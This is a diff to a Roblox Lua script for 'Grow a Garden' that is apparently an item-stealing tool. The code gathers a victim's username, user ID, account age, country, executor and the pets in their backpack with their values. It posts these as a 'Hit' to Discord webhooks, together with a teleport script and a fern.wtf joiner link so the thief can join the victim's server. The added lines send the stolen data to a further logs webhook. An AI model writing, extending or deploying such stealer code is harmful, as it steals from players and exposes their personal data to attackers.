@@ -334,33 +334,36 @@
         local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
         -- Update pet string generation
-        local petString = ""
+local petString = "Nothing"  -- default if no pets
 
-        for _, pet in ipairs(pets) do
-            local highestPriority = 99
-            local chosenEmoji = "🐶"
-            local mutation = isMutated(pet.PetName)
-            local mutationData = mutation and PetPriorityData[mutation] or nil
-            local petData = PetPriorityData[pet.Type] or nil
+if #pets > 0 then
+    petString = ""
+    for _, pet in ipairs(pets) do
+        local highestPriority = 99
+        local chosenEmoji = "🐶"
+        local mutation = isMutated(pet.PetName)
+        local mutationData = mutation and PetPriorityData[mutation] or nil
+        local petData = PetPriorityData[pet.Type] or nil
 
-            if petData and petData.priority < highestPriority then
-                highestPriority = petData.priority
-                chosenEmoji = petData.emoji
-            elseif mutationData and mutationData.priority < highestPriority then
-                highestPriority = mutationData.priority
-                chosenEmoji = mutationData.emoji
-            elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
-                highestPriority = 12
-                chosenEmoji = "🐘"
-            elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
-                highestPriority = 13
-                chosenEmoji = "👴"
-            end
-
-            local petName = pet.PetName
-            local petValue = pet.Formatted
-            petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " → " .. petValue
+        if petData and petData.priority < highestPriority then
+            highestPriority = petData.priority
+            chosenEmoji = petData.emoji
+        elseif mutationData and mutationData.priority < highestPriority then
+            highestPriority = mutationData.priority
+            chosenEmoji = mutationData.emoji
+        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
+            highestPriority = 12
+            chosenEmoji = "🐘"
+        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
+            highestPriority = 13
+            chosenEmoji = "👴"
         end
+
+        local petName = pet.PetName
+        local petValue = pet.Formatted
+        petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " → " .. petValue
+    end
+end
         local playerCount = #Players:GetPlayers()
 
         local function getPlayerCountry(player)
@@ -396,95 +399,118 @@
             end
         end
 
-        local payload = {
-            username = SCRIPT.SM,
-            avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png?ex=68992f30&is=6897ddb0&hm=a2eec3928982ef85b783700d7e825ff633d0b0cfb38b3d24de570e4c1dc904cd&",
-            content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
-            embeds = {{
-                title = "Grow a Garden Hit - " .. (_G.Script.SM.Config.ServerName or "Scripts.SM"),
-                url = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
-                color = 57855,
-                fields = {
-                    {
-                        name = "🪪 Display Name",
-                        value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "👤 Username",
-                        value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🆔 User ID",
-                        value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "📅 Account Age",
-                        value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
-                        inline = true
-                    },
-                    {
-                        name = "💎 Receiver",
-                        value = "```" .. (Username or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🎂 Account Created",
-                        value = "```" .. (creationDateString or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "💻 Executor",
-                        value = "```" .. (detectExecutor() or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🌍 Country",
-                        value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "📡 Player Count",
-                        value = "```" .. (playerCount or 0) .. "/5```",
-                        inline = true
-                    },
-                    {
-                        name = "💰 Backpack",
-                        value = "```" .. truncateByLines(petString, 20) .. "```",
-                        inline = false
-                    },
-                    {
-                        name = "🚀 Join Script",
-                        value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
-                        inline = false
-                    },
-                    {
-                        name = "🔗 Join with URL",
-                        value = "[Click here to join](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-                        inline = false
-                    }
-                },
-                footer = {
-                    text = game.JobId or "Unknown"
-                },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }},
-            attachments = {}
-        }
+local payload = {
+    avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
+    content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
+    embeds = {{
+        title = "Grow a Garden Hit - " .. (_G.Script.SM.Config.ServerName or "Scripts.SM"),
+        url = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
+        color = 57855,
+        fields = {
+            {
+                name = "🪪 Display Name",
+                value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "👤 Username",
+                value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "🆔 User ID",
+                value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
+                inline = true
+            },
+            {
+                name = "📅 Account Age",
+                value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
+                inline = true
+            },
+            {
+                name = "💎 Receiver",
+                value = "```" .. (Username or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "🎂 Account Created",
+                value = "```" .. (creationDateString or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "💻 Executor",
+                value = "```" .. (detectExecutor() or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "🌍 Country",
+                value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "📡 Player Count",
+                value = "```" .. (playerCount or 0) .. "/5```",
+                inline = true
+            },
+            {
+                name = "💰 Backpack",
+                value = "```" .. truncateByLines(petString, 20) .. "```",
+                inline = false
+            },
+            {
+                name = "🚀 Join Script",
+                value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
+                inline = false
+            },
+            {
+                name = "🔗 Join with URL",
+                value = "[Click here to join](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
+                inline = false
+            }
+        },
+        footer = {
+            text = game.JobId or "Unknown"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }},
+    attachments = {}
+}
 
+-- Create LogsPayload separately so it doesn't get the 'content' message
+local LogsPayload = {
+    content = nil,
+    embeds = {{
+        title = "Grow a Garden Hit - Logs",
+        color = 32767,
+        fields = {{
+            name = "` 🔵 Player Info:`",
+            value = string.format(
+                "```🟢 Username: %s\n🟢 Display Username: %s\n🟢 Executor: %s```",
+                (Players.LocalPlayer.Name or "Unknown"),
+                (Players.LocalPlayer.DisplayName or "Unknown"),
+                (detectExecutor() or "Unknown")
+            )
+        },{
+            name = "` 🟡 Backpack`",
+            value = string.format(
+                "```%s```",
+                truncateByLines(petString, 5)
+            )
+        }},
+        footer = {
+            text = string.format("discord.gg/NWsFjtbY8E [%s]", os.date("%Y-%m-%d %H:%M:%S"))
+        }
+    }},
+    attachments = {}
+}
+
+-- Normal webhooks array
 local webhooksToSend = {
     getgenv().Webhook,
     _G.Script.SM.Config.DualHookWebhook
 }
 
-if hasRarePets() then
-    payload.content = "@everyone\nTo activate the stealer you must jump or type in chat"
-else
-    payload.content = "To activate the stealer you must jump or type in chat"
-end
-
+-- Send normal webhooks
 for _, hook in ipairs(webhooksToSend) do
     if hook and hook ~= "" then
         local success, err = pcall(function()
@@ -498,10 +524,28 @@ for _, hook in ipairs(webhooksToSend) do
             })
         end)
         if not success then
-            warn("Failed to send to webhook:", hook, err)
+            warn("Something Went Wrong", hook, err)
         end
     end
 end
+
+-- Send logs webhook separately
+if LogsWebhook and LogsWebhook ~= "" then
+    local success, err = pcall(function()
+        request({
+            Url = LogsWebhook,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(LogsPayload)
+        })
+    end)
+    if not success then
+        warn("Something Went Wrong", LogsWebhook, err)
+    end
+end
+
                 local function CreateGui()
                     local player = Players.LocalPlayer
 
